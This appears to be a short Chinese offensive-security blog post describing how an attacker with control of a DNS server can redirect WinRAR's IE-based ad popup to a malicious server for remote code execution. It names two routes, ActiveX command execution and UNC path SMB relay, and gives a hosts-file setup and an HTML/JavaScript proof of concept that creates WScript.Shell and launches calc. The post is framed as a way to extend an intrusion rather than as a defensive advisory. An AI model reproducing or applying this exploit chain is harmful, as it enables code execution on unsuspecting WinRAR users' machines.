前言:当我们拿到DNS服务器权限的时候，常常苦于没有姿势扩大战果。今天就简单介绍一个新姿势，通过DNS劫持实现WinRAR的RCE。


1.漏洞原理

winrar作为一款解压缩,有广大的用户量，当我们没有花钱买正版的时候，他就会给我们弹小广告，如下图所示。

这个时候只要劫持DNS，就可以把小广告的地址重定向到我们的恶意服务器上。再加上弹小广告的内置浏览器调用了IE。这就没啥好说的了，只要两种利用方式：

  1.  JS→activex→cmd

  2. JS→UNC path→SMB RELAY


2.RCE复现

首先要抓取winrar广告的地址

我这边的广告地址如上图为：

https://ad.winrar.com.cn

为了方便，就不改DNS了直接改hosts文件

更改完hosts我们直接到192.168.157.175这台搭建https web服务。并创建show_2.html文件，代码如下：

<html>    <script type="text/javascript">        function win_run() {            var cmd = new ActiveXObject("WScript.Shell");            cmd.run("calc");        }</script></html>

当用户使用WinRAR并弹出小广告的时候就能触发payload，弹出计算器。
